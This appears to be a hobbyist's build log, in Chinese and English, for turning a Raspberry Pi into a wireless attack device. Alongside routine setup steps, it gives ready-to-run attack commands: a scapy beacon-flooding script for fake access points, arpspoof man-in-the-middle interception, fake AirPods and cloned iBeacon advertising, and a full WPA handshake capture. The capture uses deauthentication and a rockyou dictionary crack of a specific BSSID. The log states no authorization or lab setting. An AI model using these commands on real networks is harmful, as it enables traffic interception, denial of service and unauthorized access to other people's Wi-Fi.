I will write down the testing process here. After that, mix it with UI interface...

# 樹莓派變身攻擊工具製作紀錄

使用 repo：https://github.com/RoganDawes/P4wnP1_aloa

製作開機 SD 卡
![Screenshot 2025-01-25 at 14.21.12](https://hackmd.io/_uploads/r1zGQbGOkl.png)

無法開機，解決不了

---

改用虛擬機，M1 電腦查網卡，沒有 driver，哭

Finally, after I Constantly ask the [issus](https://github.com/morrownr/USB-WiFi/issues/571) I successful install the driver with this repo: https://github.com/morrownr/8821au-20210708

---

## Crete mutiple AP

### Use deference channel and frequency band

* Create `*.conf` file:

```
interface=wlan0
driver=nl80211
ssid=00-Never-gonna-give-you-up
hw_mode=g
channel=1
auth_algs=1
ignore_broadcast_ssid=0
```

config `hw_mode` to `a` (2.4GHz) or `g` (5GHz)
for 2.4 GHz use channel 1, 6, 11
for 5 GHz use channel 36, 44, 149, 157, 165

```bash=
# kill conflict process
sudo airmon-ng check kill
sudo killall hostapd
sudo killall wpa_supplicant

# Reset wireless interface
sudo ip link set wlan0 down
sudo iw dev wlan0 set type managed
sudo ip link set wlan0 up

# Start up Fake AP
sudo hostapd -dd ap1.conf

```

### Create mutiple virtual interface

* May be can try this driver: [https://github.com/ivanovborislav/rtl8821au](https://github.com/ivanovborislav/rtl8821au)

### Create mutiple virtual interface on ESP

* Try to use this repo: [https://github.com/SpacehuhnTech/esp8266_deauther/tree/v2](https://github.com/SpacehuhnTech/esp8266_deauther/tree/v2)

### BSSID broadcast method from AI

#### Add virtual interface

```bash
sudo iw dev wlan0 interface add vwlan0 type monitor
sudo ip link set vwlan0 up
```

#### **步驟 1：設置 Raspberry Pi**
1. **安裝作業系統**：
   - 下載 Raspberry Pi OS Lite 並使用工具（如 Raspberry Pi Imager）將其寫入 MicroSD 卡。
   - 啟用 SSH（在 `boot` 分割區中創建空的 `ssh` 檔案），並插入 MicroSD 卡啟動 Raspberry Pi。
2. **連接並更新**：
   - 通過 SSH 連接到 Pi（預設用戶名：`pi`，密碼：`raspberry`）。
   - 更新系統：`sudo apt update && sudo apt upgrade -y`。

#### **步驟 2：檢查 WiFi 晶片能力**
1. **安裝必要工具**：
   ```bash
   sudo apt install -y iw aircrack-ng
   ```
2. **檢查監聽模式支援**：
   - 列出 WiFi 介面：`iw dev`（通常為 `wlan0`）。
   - 測試監聽模式：`sudo iw dev wlan0 set type monitor`。
   - 如果失敗，說明內建驅動（`brcmfmac`）可能需要調整。

   **注意**：Raspberry Pi 的內建 WiFi 晶片可能不支援直接的監聽模式或數據包注入。若失敗，可嘗試以下修復：
   - 安裝 `nexmon` 固件補丁（支援 CYW43439 的數據包注入功能）。

#### **步驟 3：安裝 Nexmon（若需要）**
`nexmon` 是一個開源項目，可以為 Broadcom/Cypress WiFi 晶片解鎖監聽模式和數據包注入功能。
1. **安裝依賴**：
   ```bash
   sudo apt install -y git raspberrypi-kernel-headers build-essential
   ```
2. **下載並編譯 Nexmon**：
   ```bash
   git clone https://github.com/seemoo-lab/nexmon.git
   cd nexmon
   make
   cd utilities/nexmon_bcm43455
   make install
   ```
3. **啟用監聽模式**：
   ```bash
   sudo modprobe brcmfmac
   sudo nexmon -i wlan0
   sudo iw dev wlan0 set type monitor
   sudo ifconfig wlan0 up
   ```

#### **步驟 4：編寫 Python 腳本**
使用 `scapy` 構造並發送信標框架。
1. **安裝 scapy**：
   ```bash
   sudo apt install -y python3-pip
   pip3 install scapy
   ```
2. **編寫腳本**（例如 `rickroll_beacon.py`）：
   ```python
   from scapy.all import *
   import time

   # Rickroll 歌詞作為 SSID
   ssids = ["Never Gonna", "Give You Up", "Let You Down", "Run Around", "And Desert You"]
   interface = "wlan0"

   # 構造並發送信標框架
   def send_beacon(ssid):
       dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",  # 廣播地址
                     addr2=RandMAC(), addr3=RandMAC())  # 隨機 MAC
       beacon = Dot11Beacon(cap="ESS")
       essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
       frame = RadioTap()/dot11/beacon/essid
       print(f"Sending beacon: {ssid}")
       sendp(frame, iface=interface, count=100, inter=0.1)

   # 循環發送
   while True:
       for ssid in ssids:
           send_beacon(ssid)
           time.sleep(0.5)
   ```
3. **運行腳本**：
   ```bash
   sudo python3 rickroll_beacon.py
   ```

#### **步驟 5：測試**
- 在附近設備上掃描 WiFi 網路，應該能看到 "Never Gonna"、"Give You Up" 等假連線點。
- 若訊號微弱，可調整天線或移動 Pi 的位置。

---

## 監聽

### ARP Spoofing

```bash=
sudo apt-get update
sudo apt-get install dsniff wireshark

# Turn into managed mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type managed
sudo ip link set wlan0 up

# ip forward
sudo sysctl -w net.ipv4.ip_forward=1

# 欺騙目標機器，使其認為攻擊者是路由器
sudo arpspoof -i wlan0 -t 192.168.1.5 192.168.1.1

# 欺騙路由器，使其認為攻擊者是目標機器
sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.5

# record it
wireshark &
```


---

## Using Raspberry pi zero 2w successful

> [!Important]
> Remember to use "Raspberry Pi Imager" application rather than Using simple imager creater

If you want to make conversation with rapberry pi through TTL module, you have to do the following steps:

1. Shutdown Raspberry Pi
2. take out the SD card on the Raspberry Pi
3. plug in the SD card into your computer
4. Add following content anywhere in the "config.txt" file witch on the path root in the SD card
    ```
    # 啟用 UART
    enable_uart=1

    dtoverlay=uart1

    # 設定固定核心頻率，避免 UART 傳輸出現問題
    core_freq=250
    ```
5. Connect TTL module to your Raspberry Pi and make sure your TTL module voltag is 3.3v
    * Raspberry Pi TX (GPIO14) → USB-TTL RX
    * Raspberry Pi RX (GPIO15) → USB-TTL TX
    * Raspberry Pi GND → USB-TTL GND
    * They aren't need VCC
6. Using PuTTy to make conversation with Raspberry Pi
7. For MacOS user, use screen command:
    ```
    # 先找到 USB-TTL 設備名稱
    ls /dev/tty.*

    # 通常會看到類似 /dev/tty.usbserial-XXXXXX 的設備
    # 然後使用 screen 連接，波特率設為 115200
    screen /dev/tty.usbserial-XXXXXX 115200
    ```
8. After making conversation, log in kali operating system with `kali` string as the username and password
9. If you want to exit the connect, press `ctrl+A` and then press `ctrl+\`

---

## Connect to Wi-Fi

1. scan avaliable wifi AP:
    ```bash
    sudo iwlist wlan0 scan | grep ESSID
    ```
2. enable `wpa_supplicant` service:
    ```bash
    sudo systemctl enable wpa_supplicant
    ```
3. create config file:
    ```bash=
    sudo bash -c 'cat > /etc/wpa_supplicant/wpa_supplicant.conf << EOF
    ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
    update_config=1
    country=TW

    network={
        ssid="您的網路名稱"
        psk="您的WiFi密碼"
    }
    EOF'
    ```
4. restart service and reboot
    ```bash=
    sudo systemctl restart wpa_supplicant
    sudo systemctl restart networking
    sudo reboot
    ```
5. turn of power manager (IDK what is that)
    ```bash
    sudo iwconfig wlan0 power off
    ```
6. kill the process of wpa_supplicant
    ```bash
    sudo killall wpa_supplicant
    ```
7. manually active wpa_supplicant
    ```bash
    sudo wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf
    ```
8. get the IP:
    ```bash
    sudo dhclient wlan0
    ```
9. Modify NetworkManager settings:
    ```bash
    sudo nano /etc/NetworkManager/conf.d/wifi-powersave.conf
    ```
    
    and insert following content:
    ```=
    [connection]
    wifi.powersave = 2
    ```
10. enable wpa_supplicant auto run when power on:
    ```bash
    sudo systemctl enable wpa_supplicant
    ```
11. insert following content to `/etc/network/interfaces` file
    ```=
    auto wlan0
    allow-hotplug wlan0
    iface wlan0 inet dhcp
        wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf
    ```
12. auto run script for turn of power manager
    ```bash
    sudo nano /etc/rc.local
    ```
    
    and insert following content:
    ```
    iwconfig wlan0 power off
    ```
13. make sure it the script have run permision
    ```bash
    sudo chmod +x /etc/rc.local
    ```
    
---

## fix can't use pip problem

```bash=
sudo apt-get purge python python3 python-pip python3-pip

sudo apt autoremove

sudo apt-get install python python3 python-pip python3-pip
```

then use `python3 -m venv env` to use pip

---

## Fake Airpods devices

* used [hexway/apple_bleee](https://github.com/hexway/apple_bleee) repo
* install
    ```bash=
    # clone main repo
    git clone https://github.com/hexway/apple_bleee.git && cd ./apple_bleee
    # install dependencies
    sudo apt update && sudo apt install -y bluez libpcap-dev libev-dev libnl-3-dev libnl-genl-3-dev libnl-route-3-dev cmake libbluetooth-dev
    sudo pip3 install -r requirements.txt
    # clone and install owl for AWDL interface
    git clone https://github.com/seemoo-lab/owl.git && cd ./owl && git submodule update --init && mkdir build && cd build && cmake .. && make && sudo make install && cd ../..
    ```
* use:
    ```
    sudo python3 adv_airpods.py -r
    ```
    
---

## Emluate beacon checkin bluetooth device

1. scan the beacon device and get uuid
    * using lightblue mobile app to verify it
    * make sure it's Android version
    * the UUID wile show in `Adv. packet`
3.  install relation tools
    ```bash
    sudo apt install bluez bluez-tools -y
    ```
2. list the bluetooth device on raspberry pi
    ```bash
    hciconfig
    ```
    * that way display following content:
        ```
        hci0:   Type: Primary  Bus: UART
            BD Address: XX:XX:XX:XX:XX:XX  ACL MTU: 1021:8  SCO MTU: 64:1
            DOWN
        ```
    * if there shows `DOWN`, active it:
        ```bash
        sudo hciconfig hci0 up
        ```
    * then check it again
3. stop others bluetooth process:
    ```bash
    sudo systemctl stop bluetooth
    ```
4. turn it into boardcase mode
    ```bash
    sudo hciconfig hci0 leadv 3
    ```
    * `3` 表示非連接廣播，適合 iBeacon。
5. run boardcase:
    ```bash
    sudo hcitool -i hci0 cmd 0x08 0x0008 1E 02 01 06 1A FF 4C 00 02 15 AA 21 98 B2 46 30 11 EE BE 56 02 42 AC 12 00 02 00 01 00 02 C8
    ```
6. using lightblue mobile app to verify it
    * make sure it's Android version
    * the UUID wile show in `Adv. packet`

---

## Use TFT screen

1. connect tft and raspberrypi
    * MOSI -> GPIO10 (實體腳位 19)
    * MISO -> GPIO9 (實體腳位 21)
    * SCLK -> GPIO11 (實體腳位 23)
    * DC -> GPIO24 (實體腳位 18)
    * RST -> GPIO25 (實體腳位 22)
    * CS -> GPIO8 (實體腳位 24)
    * LED -> GPIO18 (實體腳位 12)
    * VCC -> 3.3V
    * GND -> GND
2. install package
    ```bash
    sudo apt-get install python3-spidev python3-rpi.gpio
    ```
3. enable SPI
    ```bash
    sudo raspi-config
    ```
4. run python script

---

## wifi access points(AP) attack

1. install tools
    ```bash
    sudo apt install aircrack-ng iw wireless-tools -y
    ```
2. create new virtual network card and launch up it.
    ```bash=
    sudo iw phy phy0 interface add wlan1 type monitor
    sudo ifconfig wlan1 up
    ```
3. check the network cards status
    ```bash
    iwconfig
    ```
    
    Example output:
    ```
    kali@raspberrypizerow:~$ iwconfig
    lo        no wireless extensions.

    wlan0     IEEE 802.11  ESSID:"PingAn"  
              Mode:Managed  Frequency:2.442 GHz  Access Point: 78:8C:B5:62:11:37   
              Bit Rate=24 Mb/s   Tx-Power=31 dBm   
              Retry short limit:7   RTS thr:off   Fragment thr:off
              Power Management:on
              Link Quality=42/70  Signal level=-68 dBm  
              Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
              Tx excessive retries:73  Invalid misc:0   Missed beacon:0

    wlan1     IEEE 802.11  Mode:Monitor  Frequency:2.442 GHz  
              Retry short limit:7   RTS thr:off   Fragment thr:off
              Power Management:on
          ```

note:

with driver problem, use nexmon repo, but there is not support kali linux, so have to do something in this issus: https://github.com/seemoo-lab/nexmon/issues/619

After trying (I'm not sure witch step can be skip):
1. Trying install nexmon (https://github.com/seemoo-lab/nexmon)
2. And it will be error
3. Install be No. 619 issus
    ```bash
     wget http://archive.raspberrypi.org/debian/pool/main/f/firmware-nonfree/firmware-brcm80211_0.43+rpi6_all.deb
    sudo apt install ./firmware-brcm80211_0.43+rpi6_all.deb -y --allow-downgrades
    ```
    
    And make new firmware
    
    ```bash
    sudo cp /lib/firmware/brcm/brcmfmac43436s-sdio.bin /lib/firmware/brcm/brcmfmac43436s-sdio.bin.bak
    sudo cp /lib/firmware/brcm/brcmfmac43436s-sdio.txt /lib/firmware/brcm/brcmfmac43436s-sdio.txt.bak
    sudo ln -sf /lib/firmware/brcm/brcmfmac43430-sdio.bin /lib/firmware/brcm/brcmfmac43436s-sdio.bin
    sudo ln -sf /lib/firmware/brcm/brcmfmac43430-sdio.txt /lib/firmware/brcm/brcmfmac43436s-sdio.txt
    ```
    
    And then reboot
    
    ```bash
    sudo reboot
    ```
4. Active new monitor mode interface:
    ```bash
    sudo iw phy `iw dev wlan0 info | gawk '/wiphy/ {printf "phy" $2}'` interface add mon0 type monitor
    ```
5. check about actived new interface
    ```bash
    iwconfig
    ```
6. there are two command to scan nearby Wi-Fi below:
    ```bash
    sudo aireplay-ng -9 mon0
    sudo airodump-ng mon0
    ```
7. After scanned the nearby Wi-Fi, record your target Wi-Fi BSSID and channel
8. capture packet
    ```bash
    sudo airodump-ng -c 7 --bssid B0:BE:76:CD:97:24 -w capture mon0
    ```
    * modify `7` into your target Wi-Fi channel number
    * modify `B0:BE:76:CD:97:24` into your target Wi-Fi BSSID
9. make Wi-Fi clients reconnect AP for capture handshake
    ```bash
    sudo aireplay-ng --deauth 10 -a B0:BE:76:CD:97:24 mon0
    ```
10. checking number of handshake packet (need more then 1)
    ```bash
    sudo aircrack-ng capture-01.cap
    ```
11. cracking Wi-Fi password
    ```bash
    sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b B0:BE:76:CD:97:24 capture-01.cap
    ```
12. successful crack Wi-Fi password
